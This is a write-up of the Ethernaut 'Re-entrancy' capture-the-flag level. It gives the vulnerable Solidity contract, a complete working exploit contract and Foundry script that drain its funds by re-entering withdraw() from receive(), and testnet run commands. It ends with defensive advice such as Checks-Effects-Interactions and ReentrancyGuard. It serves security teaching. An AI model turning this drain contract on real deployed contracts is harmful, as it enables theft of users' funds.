# Level 10 - Re-entrancy ⏺⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/10" %}

### Level Setup

{% hint style="info" %}
The goal of this level is for you to steal all the funds from the contract.

&#x20; Things that might help:

* Untrusted contracts can execute code where you least expect it.
* Fallback methods
* Throw/revert bubbling
* Sometimes the best way to attack a contract is with another contract.
* See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/Reentrance.sol" %}

{% code lineNumbers="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```
{% endcode %}

### Exploit

The exploit is a standard reentrancy attack made possible because the funds are sent before the state variable is updated. The receiving contract can then call the withdraw function again, leading to more funds being withdrawn than should have been available.

1. Call the `withdraw()` function from the `receive()` function.

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-10

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-10

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Contract" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/src/Level10.sol" %}

{% code title="src/Level10.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

/**
 * Explainer from: https://solidity-by-example.org/fallback
 * ETH is sent to contract
 *      is msg.data empty?
 *           /    \
 *         yes    no
 *         /       \
 *    receive()?  fallback()
 *      /     \
 *    yes     no
 *    /        \
 * receive()  fallback()
 */

// ================================================================
// │                       LEVEL 10 - REENTRANCY                  │
// ================================================================
contract Reentrancy {
    IReentrance targetContract;
    uint256 attackValue;

    constructor(address _targetContractAddress) payable {
        targetContract = IReentrance(_targetContractAddress);
        attackValue = address(targetContract).balance;
        if (attackValue == 0) revert("Target contract has no funds to exploit");
        if (attackValue > address(this).balance) revert("Target contract has more funds than the exploit contract");
    }

    function attack() public {
        // Attack contract
        targetContract.donate{value: attackValue}(address(this));
        targetContract.withdraw(attackValue);

        (bool refundSuccess,) = address(msg.sender).call{value: address(this).balance}("");
        if (!refundSuccess) revert("Refund call failed");
    }

    receive() external payable {
        uint256 targetBalance = address(targetContract).balance;
        if (targetBalance >= attackValue) {
            targetContract.withdraw(attackValue);
        }
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/script/Level10.s.sol" %}

{% code title="script/Level10.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";
import {Reentrancy} from "../src/Level10.sol";

// ================================================================
// │                       LEVEL 10 - REENTRANCY                  │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        Reentrancy reentrancy = new Reentrancy{value: 1 ether}(targetContractAddress);
        reentrancy.attack();
        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

2. Submit instance... 🥳

### Completion Message

{% hint style="info" %}
In order to prevent re-entrancy attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that `call` will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.

`transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and _re-enter_ your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

&#x20;

**The DAO Hack**

The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).
{% endhint %}

### Notes

* No function, including the `receive()` function, can be invoked from logic in the constructor.
